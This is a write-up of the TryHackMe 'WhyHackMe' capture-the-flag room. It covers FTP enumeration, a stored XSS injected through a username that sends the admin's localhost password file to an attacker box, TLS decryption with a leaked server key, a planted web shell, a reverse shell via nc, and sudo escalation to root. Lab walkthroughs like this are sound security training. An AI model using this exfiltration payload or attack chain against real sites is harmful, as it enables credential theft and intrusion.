# WhyHackMe

https://tryhackme.com/room/whyhackme, rated Medium

1. A scan will reveal 21, 22 and 80. Accessing FTP reveals a `update.txt` file, saying that some credentials will be available from localhost/dir/pass.txt but only by the admin

2. Going to the website reveals a simple blog. You can login at login.php, register at register.php and so on, with blog.php being where you can leave comments once logged in. Notably, a comment from the admin already exists saying they will 'carefully review all comments made', a fairly strong hint that this is an XSS exploit.

3. The cookie for your user is HTTPOnly, so it will not be possible to steal the admin's cookie. However, first finding the point of injection is important. Creating a comment with script tags gets escaped when it is rendered. However, the user's name is also rendered and by registering a user with xss in its username, you can observe this is successfully executed.

4. To exploit the admin's viewing of the site, I created a user with the following username:

     `<script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://attack-box:1234?q="+t,{mode:"no-cors"}))</script>`

   Make a comment with any content on the blog so the stored XSS is in place. I then created a python webserver on my attack box and waited. After a minute, I got a hit:

     `10.10.63.172 - - [05/Jan/2024 21:32:15] "GET /?q=jack:[redacted] HTTP/1.1" 200 -`

6. These credentials allow access as the user 'jack' over ssh, where you can access the user flag. `sudo -l` reveals that jack can run iptables as root, but this does not provide easy privesc

7. Enumerating the machine some more, you can find under `/opt` another note and a `capture.pcap`. The note says there is a hacked site running out of `/usr/lib/cgi-bin` which is inaccessible to jack, and that the pcap will provide help. Opening the pcap reveals encrypted tls communication, with the only thing that can be recovered being the target port, 41312

8. To decrypt the traffic a SSL key log or the private key of the server is required. Fortunately, the 41312 site is defined in the `000-default.conf` under /etc/apache2/sites-available. This reveals the path of the cert, which is readable: `/etc/apache2/certs/apache.key`

9. Putting this into wireshark (Edit > Preferences > Protocols > TLS > RSA Keys List) will decrypt the traffic and show how to access the shell that has been placed on the system. To view the site externally, use `sudo iptables -D INPUT 1` as jack to delete the blocking rule. The shell which requires the correct query string params and path, allows shell exec as the user 'h4ck3d'.

10. To finish the machine, use the shell to get a reverse shell or whoever you wish to get an interactive session (the machine has nc.openbsd). Then, by checking `sudo -l` you can see the hacker user has full access. Switch to root and get the final flag.
